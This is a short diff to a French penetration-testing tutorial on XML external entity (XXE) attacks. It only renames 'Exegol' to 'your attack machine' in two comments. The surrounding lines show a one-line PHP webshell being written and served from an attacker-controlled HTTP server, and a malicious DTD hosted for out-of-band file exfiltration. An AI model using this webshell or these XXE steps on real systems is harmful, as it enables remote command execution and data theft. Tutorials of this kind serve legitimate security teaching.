@@ -218,7 +218,7 @@ Sur une stack PHP avec le module `expect` installé et activé (ce qui reste rar
 Pour aller plus loin qu'une commande basique, l'approche la plus robuste consiste à récupérer un webshell depuis un serveur qu'on contrôle plutôt que d'essayer de faire tenir une commande complexe dans la syntaxe XML :
 
 ```bash
-# Depuis Exegol - préparation d'un webshell PHP minimal
+# Depuis votre machine d'attaque - préparation d'un webshell PHP minimal
 echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
 python3 -m http.server 80
 ```
@@ -307,7 +307,7 @@ Le contournement passe par les entités paramètres (parameter entities), une va
 Concrètement, on héberge cette ligne dans un fichier DTD sur notre machine :
 
 ```bash
-# Depuis Exegol - préparation et hébergement de la DTD malveillante
+# Depuis votre machine d'attaque - préparation et hébergement de la DTD malveillante
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
 python3 -m http.server 8000
 ```
